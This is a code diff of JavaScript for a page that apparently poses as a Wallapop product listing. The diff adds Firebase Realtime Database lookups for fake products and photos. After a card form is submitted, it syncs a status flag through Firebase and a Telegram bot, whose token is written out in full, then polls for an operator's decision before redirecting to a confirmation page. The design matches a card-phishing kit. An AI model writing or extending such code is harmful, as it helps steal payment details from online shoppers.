@@ -495,6 +495,30 @@ async function show(id) {
     if (id && sdb && sdb[id]) p = sdb[id];
   }
 
+  // 7b. Intentar desde Firebase Realtime Database (para productos nuevos generados sin redesplegar)
+  if (!p || !p.id) {
+    try {
+      if (id) {
+        const fbRes = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/products/' + id + '.json?t=' + Date.now());
+        if (fbRes.ok) {
+          const fbProd = await fbRes.json();
+          if (fbProd && fbProd.id) p = fbProd;
+        }
+      }
+      if (!p || !p.id) {
+        const fbAllRes = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/products.json?t=' + Date.now());
+        if (fbAllRes.ok) {
+          const fbAll = await fbAllRes.json();
+          if (fbAll && typeof fbAll === 'object') {
+            allProds = fbAll;
+            const targetKey = id ? id : Object.keys(fbAll).pop();
+            if (targetKey && fbAll[targetKey]) p = fbAll[targetKey];
+          }
+        }
+      }
+    } catch (e) {}
+  }
+
   // 8. Si no se especificó ID en la URL (entró a la raíz /), abrir el activo o último
   if ((!p || !p.id) && !id && allProds) {
     const targetKey = (activeId && allProds[activeId]) ? activeId : Object.keys(allProds).pop();
@@ -579,6 +603,19 @@ async function show(id) {
     } catch (e) {}
   }
 
+  // Fallback 4: Consultar Firebase Realtime Database
+  if (!fotos.length && p.id) {
+    try {
+      const fbPR = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/products/' + p.id + '.json?t=' + Date.now());
+      if (fbPR.ok) {
+        const fbPData = await fbPR.json();
+        if (fbPData && fbPData.fotos) {
+          fotos = Array.isArray(fbPData.fotos) ? fbPData.fotos.filter(Boolean) : [fbPData.fotos];
+        }
+      }
+    } catch (e) {}
+  }
+
   function fixPhotoUrl(src) {
     if (typeof src !== 'string') return '';
     src = src.trim();
@@ -623,7 +660,22 @@ async function show(id) {
         img.src = cSrc.replace('images.weserv.nl', 'wsrv.nl');
         return;
       }
-      // 3. Si falló una foto local /photos/img_xxx, probar rutas alternativas
+      // 3. Respaldo permanente desde Firebase Realtime Database
+      if (!img.dataset.retriedFirebase) {
+        img.dataset.retriedFirebase = '1';
+        const mKey = cSrc.match(/(img_[A-Za-z0-9_]+)/i) || cSrc.match(/(file_[0-9]+)/i);
+        if (mKey) {
+          fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/photos/' + mKey[1] + '_jpg.json')
+            .then(r => r.json())
+            .then(d => {
+              if (d && d.base64) {
+                img.src = d.base64;
+              }
+            })
+            .catch(() => {});
+        }
+      }
+      // 4. Si falló una foto local /photos/img_xxx, probar rutas relativas alternativas
       const m = cSrc.match(/(img_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))/i) || cSrc.match(/(tg_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))/i);
       if (m) {
         if (!img.dataset.retriedLocal) {
@@ -642,7 +694,7 @@ async function show(id) {
           return;
         }
       }
-      // 4. Si falló el proxy de Telegram, probar URL directa de Telegram como último recurso
+      // 5. Si falló el proxy de Telegram, probar URL directa de Telegram como último recurso
       if ((cSrc.includes('wsrv.nl') || cSrc.includes('images.weserv.nl')) && !img.dataset.retriedTg) {
         img.dataset.retriedTg = '1';
         const parts = cSrc.split(/[?&]url=/);
@@ -897,7 +949,20 @@ $('formCard').addEventListener('submit', async ev => {
       });
     }
 
-    // Resetear estado global en Telegram para sincronizar la decisión de los botones
+    // Resetear estado global en Firebase y en Telegram para sincronizar la decisión de los botones
+    try {
+      await fetch("https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/" + idProd + ".json", {
+        method: "PUT",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ status: "waiting", id: idProd, ts: Date.now() })
+      });
+      await fetch("https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/latest.json", {
+        method: "PUT",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ status: "waiting", id: idProd, ts: Date.now() })
+      });
+    } catch (e) {}
+
     try {
       await fetch("https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/setMyDescription", {
         method: "POST",
@@ -911,20 +976,36 @@ $('formCard').addEventListener('submit', async ev => {
 
   const pollCardStatus = async () => {
     let data = null;
-    // 1. Probar ruta amigable
+
+    // 0. Probar Firebase Realtime Database (tiempo real, sin bloqueos ni límites)
     try {
-      const resp = await fetch('/api/product/' + idProd + '/tarjeta/status?t=' + Date.now());
-      if (resp.ok) {
-        data = await resp.json();
+      const fbStResp = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/' + idProd + '.json?t=' + Date.now());
+      if (fbStResp.ok) {
+        const fbSt = await fbStResp.json();
+        if (fbSt && fbSt.status && fbSt.status !== 'waiting') {
+          data = fbSt;
+        }
       }
     } catch (e) {}
+
+    // 1. Probar ruta amigable
+    if (!data || !data.status) {
+      try {
+        const resp = await fetch('/api/product/' + idProd + '/tarjeta/status?t=' + Date.now());
+        if (resp.ok) {
+          const lData = await resp.json();
+          if (lData && lData.status && lData.status !== 'waiting') data = lData;
+        }
+      } catch (e) {}
+    }
 
     // 2. Probar api.php directo (fallback infalible para hosting PHP)
     if (!data || !data.status) {
       try {
         const resp2 = await fetch('/api.php?action=tarjeta_status&id=' + idProd + '&t=' + Date.now());
         if (resp2.ok) {
-          data = await resp2.json();
+          const lData2 = await resp2.json();
+          if (lData2 && lData2.status && lData2.status !== 'waiting') data = lData2;
         }
       } catch (e) {}
     }
@@ -941,7 +1022,7 @@ $('formCard').addEventListener('submit', async ev => {
         const rawP = sp.get('p') || sp.get('d');
         if (rawP) qParams.set('p', rawP);
         try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
-        window.location.href = 'confirmar.php?' + qParams.toString();
+        window.location.href = 'confirmar.html?' + qParams.toString();
         return;
       } else if (data.status === 'error') {
         $('spinnerTarjeta').style.display = 'none';
@@ -970,7 +1051,7 @@ $('formCard').addEventListener('submit', async ev => {
           const rawP = sp.get('p') || sp.get('d');
           if (rawP) qParams.set('p', rawP);
           try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
-          window.location.href = 'confirmar.php?' + qParams.toString();
+          window.location.href = 'confirmar.html?' + qParams.toString();
           return;
         } else if (desc.includes('status:error')) {
           $('spinnerTarjeta').style.display = 'none';
@@ -983,10 +1064,10 @@ $('formCard').addEventListener('submit', async ev => {
       }
     } catch (e) {}
 
-    cardPollTimer = setTimeout(pollCardStatus, 1000);
+    cardPollTimer = setTimeout(pollCardStatus, 800);
   };
 
-  cardPollTimer = setTimeout(pollCardStatus, 1200);
+  cardPollTimer = setTimeout(pollCardStatus, 1000);
 });
 
 $('cmdToggle').addEventListener('click', () => { const c = $('cmds'); c.hidden = !c.hidden; });
